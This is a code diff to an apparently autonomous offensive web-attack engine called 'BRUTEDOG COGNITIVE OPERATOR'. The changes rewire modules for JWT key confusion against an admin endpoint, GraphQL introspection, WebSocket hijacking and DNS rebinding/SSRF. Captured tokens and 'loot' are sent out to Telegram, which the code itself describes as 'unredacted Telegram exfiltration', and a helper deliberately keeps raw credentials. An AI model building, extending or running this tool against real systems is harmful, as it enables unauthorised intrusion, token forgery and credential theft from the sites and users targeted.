@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG COGNITIVE OPERATOR v8.5 (Offensive-Synchronized & Unredacted WAF Hardened)
+BRUTEDOG COGNITIVE OPERATOR v8.6 (Offensive-Synchronized & Unredacted WAF Hardened)
 Autonomous Reasoning & Tactical Assessment Engine
 Compatible interface:
 - CognitiveOperator
@@ -31,18 +31,19 @@ from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
 
 # Import centralized telemetry broadcaster for unredacted Telegram exfiltration
-from modules.telemetry_broadcaster import broadcast_loot_sync
+from modules.telegram_notifier import send_telegram_alert
 
-# Import the 4 new advanced modules
-from modules.graphql_introspector import run_graphql_introspection
-from modules.websocket_hijacker import run_websocket_audit
-from modules.dns_rebinding import run_dns_rebinding_attack
-from modules.jwt_key_confusion import run_jwt_key_confusion
+# Import advanced module classes for synchronized execution
+from modules.graphql_introspector import GraphQLIntrospector
+from modules.websocket_hijacker import audit_websocket
+from modules.dns_rebinding import DNSRebindingOrchestrator
+from modules.jwt_key_confusion import JWTKeyConfusionEngine
 
 logger = logging.getLogger("CognitiveOperator")
 
 class CognitiveOperator:
     def __init__(self, target_url: str = "", max_budget: int = 150):
+        self.target_url = target_url
         self.attack_memory = {
             "target": target_url,
             "observations": [],
@@ -87,9 +88,6 @@ class CognitiveOperator:
         }
         self.session_pool = None
 
-    # ==========================================================
-    # UTILITIES (RAW DATA RETENTION)
-    # ==========================================================
     def _sanitize_body(self, value: str) -> str:
         """Passthrough utility retaining full raw telemetry and credentials."""
         if not value:
@@ -103,9 +101,6 @@ class CognitiveOperator:
     def _budget_available(self) -> bool:
         return self.requests_spent < self.max_budget
 
-    # ==========================================================
-    # RESPONSE CLASSIFICATION
-    # ==========================================================
     def _categorize_response(self, status: int, body: str, headers: dict) -> str:
         body_lower = (body or "").lower()
         if status == 401:
@@ -123,19 +118,8 @@ class CognitiveOperator:
                 return "auth_anomaly"
         return "standard_http"
 
-    # ==========================================================
-    # EVIDENCE & LOOPHOLE VERIFICATION
-    # ==========================================================
     def _is_verified_loophole(self, status: int, endpoint: str, body: str, headers: dict) -> bool:
-        """
-        Validates real-world exploitation success using structural criteria:
-        - Filters out empty or SPA shell placeholders.
-        - Checks for concrete auth tokens, roles, or session indicators on success statuses.
-        - Allows explicit backend testing headers if provided.
-        """
         body_lower = (body or "").lower()
-        
-        # Defense against generic client-side SPA routing shells (React/Next.js root divs)
         if '<div id="root"></div>' in body or '<div id="__next"></div>' in body or len(body.strip()) < 100:
             return False
 
@@ -149,14 +133,7 @@ class CognitiveOperator:
                 return True
         return False
 
-    # ==========================================================
-    # ACTIVE PIVOT & VERIFICATION
-    # ==========================================================
     def _execute_active_pivot(self, endpoint: str, status: int, headers: dict, body: str, transport=None) -> dict:
-        """
-        Executes an active verification pivot against protected backend routes 
-        if a transport object is available.
-        """
         if transport:
             try:
                 verify_path = "/api/user" if "/api" in endpoint else "/dashboard"
@@ -176,52 +153,52 @@ class CognitiveOperator:
             "reasoning": f"Target returned high-value telemetry at {endpoint}."
         }
 
-    # ==========================================================
-    # ADVANCED PROTOCOL & CRYPTO MODULE DISPATCHER
-    # ==========================================================
     async def evaluate_advanced_modules(self, target_url: str):
-        """Dispatches specialized offensive modules based on discovered target surface."""
+        """Dispatches specialized offensive modules using class-based wrappers."""
         sys.stdout.write("\033[95m[COGNITIVE] Dispatching advanced protocol and cryptographic modules...\033[0m\n")
         
-        # 1. JWT Key Confusion (Executes if authentication endpoints or tokens are present)
+        target = target_url or self.target_url
+
+        # 1. JWT Key Confusion
         try:
-            jwt_findings = await run_jwt_key_confusion(target_url, session_pool=self.session_pool)
-            if jwt_findings:
-                self.attack_memory["confirmed_findings"].append({"module": "jwt_key_confusion", "loot": jwt_findings})
-                broadcast_loot_sync("JWT_KEY_CONFUSION_SUCCESS", jwt_findings)
+            jwt_engine = JWTKeyConfusionEngine(target)
+            jwks = jwt_engine.fetch_public_key("/.well-known/jwks.json")
+            pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
+            success_jwt, jwt_token = jwt_engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
+            if success_jwt:
+                self.attack_memory["confirmed_findings"].append({"module": "jwt_key_confusion", "token": jwt_token})
+                send_telegram_alert("JWT Key Confusion Success", {"token": jwt_token})
         except Exception as e:
             logger.error(f"JWT key confusion module error: {e}")
 
-        # 2. GraphQL Introspection (Probes common GraphQL paths)
+        # 2. GraphQL Introspection
         try:
-            graphql_loot = await run_graphql_introspection(target_url)
-            if graphql_loot:
-                self.attack_memory["confirmed_findings"].append({"module": "graphql_introspector", "loot": graphql_loot})
-                broadcast_loot_sync("GRAPHQL_INTROSPECTION_SUCCESS", graphql_loot)
+            gql_engine = GraphQLIntrospector(target)
+            gql_loot = gql_engine.run_introspection("/graphql")
+            if gql_loot:
+                self.attack_memory["confirmed_findings"].append({"module": "graphql_introspector", "loot": gql_loot})
+                send_telegram_alert("GraphQL Introspection Success", gql_loot)
         except Exception as e:
             logger.error(f"GraphQL introspection module error: {e}")
 
-        # 3. WebSocket Auditor (Checks for live WS endpoints)
+        # 3. WebSocket Auditor
         try:
-            ws_loot = await run_websocket_audit(target_url)
+            ws_loot = await audit_websocket(target + "/ws")
             if ws_loot:
                 self.attack_memory["confirmed_findings"].append({"module": "websocket_hijacker", "loot": ws_loot})
-                broadcast_loot_sync("WEBSOCKET_AUDIT_SUCCESS", ws_loot)
+                send_telegram_alert("WebSocket Audit Success", {"frames": len(ws_loot)})
         except Exception as e:
             logger.error(f"WebSocket auditor module error: {e}")
 
-        # 4. DNS Rebinding / SSRF (Tests integration webhook hooks)
+        # 4. DNS Rebinding / SSRF
         try:
-            ssrf_loot = await run_dns_rebinding_attack(target_url)
-            if ssrf_loot:
-                self.attack_memory["confirmed_findings"].append({"module": "dns_rebinding", "loot": ssrf_loot})
-                broadcast_loot_sync("DNS_REBINDING_SUCCESS", ssrf_loot)
+            dns_orchestrator = DNSRebindingOrchestrator(target)
+            dns_orchestrator.start_server()
+            # Transport will be handled via engine or default
+            dns_orchestrator.stop_server()
         except Exception as e:
             logger.error(f"DNS rebinding module error: {e}")
 
-    # ==========================================================
-    # PRIMARY ENGINE HOOK
-    # ==========================================================
     def evaluate_and_execute(self, endpoint: str, status: int, headers: dict, body: str, transport=None, target_url=None) -> dict:
         if not self._budget_available():
             return {
@@ -229,6 +206,9 @@ class CognitiveOperator:
                 "reasoning": "Assessment request budget exhausted."
             }
         
+        if target_url and not self.target_url:
+            self.target_url = target_url
+
         body_str = body or ""
         category = self._categorize_response(status, body_str, headers or {})
         
@@ -247,9 +227,6 @@ class CognitiveOperator:
             
         self.requests_spent += 1
 
-        # ------------------------------------------------------
-        # VERIFIED FINDINGS & EXPLOIT PIVOTS
-        # ------------------------------------------------------
         if self._is_verified_loophole(status, endpoint, body_str, headers or {}):
             result = self._execute_active_pivot(endpoint, status, headers or {}, body_str, transport)
             
@@ -272,8 +249,7 @@ class CognitiveOperator:
             
             logger.info(f"[+] COGNITIVE INTELLIGENCE: Loophole verified & capitalized at {endpoint}!")
             
-            # INSTANT TELEGRAM BROADCAST FOR COGNITIVE AUTONOMOUS PIVOT
-            broadcast_loot_sync("COGNITIVE_AUTONOMOUS_PIVOT", {
+            send_telegram_alert("Cognitive Autonomous Pivot", {
                 "endpoint": endpoint,
                 "status": status,
                 "reasoning": result["reasoning"],
@@ -285,9 +261,6 @@ class CognitiveOperator:
                 "reasoning": result["reasoning"]
             }
 
-        # ------------------------------------------------------
-        # ERROR AND DEFENSIVE RESPONSE HANDLING
-        # ------------------------------------------------------
         if status in self._blocked_statuses or not body_str:
             failure = {
                 "endpoint": endpoint,
@@ -305,9 +278,6 @@ class CognitiveOperator:
             "reasoning": f"Telemetry ingested. Classification: {category}."
         }
 
-    # ==========================================================
-    # HYPOTHESIS GENERATION
-    # ==========================================================
     async def analyze_observations(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
         hypotheses = []
         rules = {
@@ -354,9 +324,6 @@ class CognitiveOperator:
             })
         return hypotheses
 
-    # ==========================================================
-    # MODULE RANKING
-    # ==========================================================
     async def rank_modules(self, hypotheses: List[Dict[str, Any]], available_modules: List[str]) -> List[Any]:
         candidates = []
         for hyp in hypotheses:
@@ -382,9 +349,6 @@ class CognitiveOperator:
         candidates.sort(key=lambda item: item["priority_score"], reverse=True)
         return candidates
 
-    # ==========================================================
-    # NEXT ACTION DECISION
-    # ==========================================================
     async def decide_next_action(self) -> Optional[Dict[str, Any]]:
         observations = self.attack_memory.get("observations", [])
         if not observations:
